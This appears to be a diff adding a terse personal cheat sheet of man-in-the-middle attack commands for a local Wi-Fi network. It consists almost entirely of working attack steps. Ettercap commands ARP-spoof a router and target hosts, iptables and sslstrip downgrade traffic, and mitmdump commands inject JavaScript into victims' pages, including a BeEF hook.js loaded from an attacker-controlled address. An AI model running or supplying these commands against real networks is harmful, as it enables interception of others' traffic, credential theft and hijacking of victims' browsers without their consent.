@@ -1,0 +1,29 @@
+-------------------------------
+-------------------------------
+MITM
+
+sudo ettercap -Tq -M arp:remote -i wlan0 /192.168.1.1// /192.168.1.108//
+sudo ettercap -Tq -M arp:remote -i wlan0 /192.168.1.1// /192.168.1.108-200// == 108 to 200
+sudo ettercap -Tq -M arp:remote -i wlan0 /192.168.1.1// /192.168.1.108, 192.168.1.110// 
+-------------------------------
+-------------------------------
+sslstrip
+
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 && sslstrip. Then fire up MITM
+-------------------------------
+-------------------------------
+js injection
+
+First run "sudo ettercap -Tq -M arp:remote -i wlan0 -S /192.168.1.1// /192.168.1.108//" after that run bottom one
+
+./mitmdump --mode transparent --modify-body :~s:"</body>":"<script>alert('i hack u');</script></body>"
+./mitmweb --mode transparent == That's for GUI
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+-------------------------------
+-------------------------------
+Beef injection
+
+First start "beef"
+After that run "sudo ettercap -Tq -M arp:remote -i wlan0 -S /192.168.1.1// /192.168.1.108//"
+Then ./mitmdump --mode transparent --modify-body :~s:"</body>":"<script src="http://192.168.1.125:3000/hook.js"></script></body>"
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
